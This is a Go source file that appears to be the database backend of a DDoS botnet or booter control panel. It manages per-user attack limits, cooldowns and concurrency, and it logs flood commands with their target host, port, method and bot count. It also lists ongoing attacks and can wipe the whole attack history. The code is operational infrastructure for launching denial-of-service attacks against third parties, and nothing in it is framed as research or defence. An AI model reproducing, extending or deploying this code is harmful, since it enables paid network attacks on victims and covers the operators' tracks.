package database

import (
	"errors"
	"fmt"
	"strconv"
	"strings"
	"sync"
	"time"

	_ "github.com/go-sql-driver/mysql"
	"github.com/shirou/gopsutil/host"
	"github.com/shirou/gopsutil/mem"
)

type AttackOngoing struct {
	AttackID int
	UserID   int
	Duration int
	Command  string
	Attacked int64
	Method   string
	Target   string
	Dport    string
	Length   string
	Username string
}

func (db *Database) GetTotalAttacks(username string) (int, error) {
	var totalAttacks int

	err := db.db.QueryRow("SELECT `totalAttacks` FROM `users` WHERE `username` = ?", username).Scan(&totalAttacks)
	if err != nil {
		return 0, err
	}

	return totalAttacks, nil
}

func (db *Database) IncreaseTotalAttacks(username string) error {
	_, err := db.db.Exec("UPDATE users SET totalAttacks = totalAttacks + 1 WHERE username = ?", username)
	return err
}

func (db *Database) GetUserTotalAttacks(username string) (int, error) {
	var totalAttacks int
	err := db.db.QueryRow("SELECT totalAttacks FROM users WHERE username = ?", username).Scan(&totalAttacks)
	if err != nil {
		return 0, err
	}
	return totalAttacks, nil
}

func (db *Database) GetMaxAttacks(username string) (int, error) {
	var maxAttacks int
	err := db.db.QueryRow("SELECT maxAttacks FROM users WHERE username = ?", username).Scan(&maxAttacks)
	if err != nil {
		return 0, err
	}
	return maxAttacks, nil
}

func (db *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
	rows, err := db.db.Query("SELECT id, maxTime, cooldown, maxAttacks, totalAttacks FROM users WHERE username = ?", username)
	if err != nil {
		fmt.Println(err)
		return false, err
	}
	defer rows.Close()

	var userId, durationLimit, cooldown, UserMaxAttacks, TotalAttacks uint32
	if !rows.Next() {
		return false, errors.New("your access has been terminated")
	}
	err = rows.Scan(&userId, &durationLimit, &cooldown, &UserMaxAttacks, &TotalAttacks)
	if err != nil {
		return false, err
	}

	if int(UserMaxAttacks) != 9999 && !db.IsSuper(username) && TotalAttacks >= UserMaxAttacks {
		return false, errors.New("max attacks reached. You cannot launch more attacks")
	}

	if durationLimit != 0 && duration > durationLimit && !db.IsSuper(username) {
		return false, fmt.Errorf("You may not send attacks longer than %d seconds.", durationLimit)
	}
	rows.Close()

	if allowConcurrent == 0 {
		now := time.Now().Unix()
		rows, err = db.db.Query("SELECT time_sent FROM history WHERE user_id = ? AND (time_sent + ?) > ? ORDER BY time_sent DESC LIMIT 1", userId, cooldown, now)
		if err != nil {
			fmt.Println(err)
			return false, err
		}
		defer rows.Close()

		if rows.Next() {
			var timeSent int64
			err := rows.Scan(&timeSent)
			if err != nil {
				return false, err
			}
			return false, fmt.Errorf("Please wait %d seconds before sending another attack", (timeSent+int64(cooldown))-now)
		}
	}

	return true, nil
}

var (
	ongoingCache      int
	lastOngoingUpdate time.Time
	ongoingMutex      sync.Mutex

	memCache      *mem.VirtualMemoryStat
	uptimeCache   uint64
	lastSysUpdate time.Time
	sysStatsMutex sync.Mutex
)

func (db *Database) GetSystemStats() (*mem.VirtualMemoryStat, uint64) {
	sysStatsMutex.Lock()
	defer sysStatsMutex.Unlock()

	if time.Since(lastSysUpdate) < 5*time.Second && memCache != nil {
		return memCache, uptimeCache
	}

	m, _ := mem.VirtualMemory()
	u, _ := host.Uptime()

	memCache = m
	uptimeCache = u
	lastSysUpdate = time.Now()

	return m, u
}

func (db *Database) LogAttack(username string, duration int, command string, bots int) error {
	var userId int
	err := db.db.QueryRow("SELECT id FROM users WHERE username = ?", username).Scan(&userId)
	if err != nil {
		return err
	}

	now := time.Now().Unix()
	_, err = db.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, ?, ?, ?, ?)", userId, now, duration, command, bots)

	if err == nil {
		lastOngoingUpdate = time.Unix(0, 0)
	}

	
	go func() {
		NewMessage(command, strconv.Itoa(duration), userId)
	}()

	return err
}

func (db *Database) NumOngoing() int {
	ongoingMutex.Lock()
	defer ongoingMutex.Unlock()

	if time.Since(lastOngoingUpdate) < 2*time.Second {
		return ongoingCache
	}

	now := time.Now().Unix()
	query := `SELECT count(*) FROM history WHERE time_sent + duration > ?;`

	var count int
	err := db.db.QueryRow(query, now).Scan(&count)
	if err != nil {
		fmt.Printf("database/NumOngoing() [QueryRow()]: %v\n", err)
		return ongoingCache
	}

	ongoingCache = count
	lastOngoingUpdate = time.Now()
	return count
}

func (db *Database) GetUserOngoingAttackRemaining(username string) (int, error) {
	now := time.Now().Unix()
	query := `
		SELECT (history.time_sent + history.duration) - ?
		FROM history
		JOIN users ON history.user_id = users.id
		WHERE users.username = ? AND history.time_sent + history.duration > ?
		ORDER BY history.time_sent DESC LIMIT 1;
	`
	var remaining int
	err := db.db.QueryRow(query, now, username, now).Scan(&remaining)
	if err != nil {
		return 0, err
	}
	return remaining, nil
}

func (db *Database) GetGlobalOngoingAttackRemaining() (int, error) {
	now := time.Now().Unix()
	query := `
		SELECT (time_sent + duration) - ?
		FROM history
		WHERE time_sent + duration > ?
		ORDER BY time_sent DESC LIMIT 1;
	`
	var remaining int
	err := db.db.QueryRow(query, now, now).Scan(&remaining)
	if err != nil {
		return 0, err
	}
	return remaining, nil
}

func (db *Database) GetOngoingAttacks() ([]map[string]string, error) {
	now := time.Now().Unix()
	query := `
		SELECT users.username, history.time_sent, history.duration, history.command
		FROM history
		JOIN users ON history.user_id = users.id
		WHERE history.time_sent + history.duration > ?;
	`

	rows, err := db.db.Query(query, now)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var attacks []map[string]string

	for rows.Next() {
		var username, command string
		var timeSent, duration int64

		if err := rows.Scan(&username, &timeSent, &duration, &command); err != nil {
			return nil, err
		}

		commandParts := strings.Fields(command)
		if len(commandParts) < 3 {
			continue
		}

		attack := make(map[string]string)
		attack["username"] = username
		attack["host"] = commandParts[1]
		attack["port"] = "65535" 

		
		if len(commandParts) >= 5 && strings.HasPrefix(commandParts[0], "!") {
			attack["port"] = commandParts[2]
		} else {
			
			for _, part := range commandParts[2:] {
				if strings.HasPrefix(part, "dport=") {
					attack["port"] = strings.TrimPrefix(part, "dport=")
				}
			}
		}

		attack["duration"] = fmt.Sprintf("%d", duration)
		attack["floodType"] = strings.TrimPrefix(commandParts[0], "!")
		attack["time"] = time.Unix(int64(timeSent), 0).Format("Mon Jan 2 15:04:05 MST 2006")
		attack["full_command"] = command
		attack["remaining"] = fmt.Sprintf("%d", (timeSent+duration)-now)

		attacks = append(attacks, attack)
	}

	return attacks, nil
}

func (db *Database) CleanLogs() bool {
	_, err := db.db.Exec("DELETE FROM history")
	if err != nil {
		fmt.Println(err)
		return false
	}
	return true
}

func (db *Database) ResetAllUserAttacks() error {
	_, err := db.db.Exec("UPDATE users SET totalAttacks = 0")
	return err
}
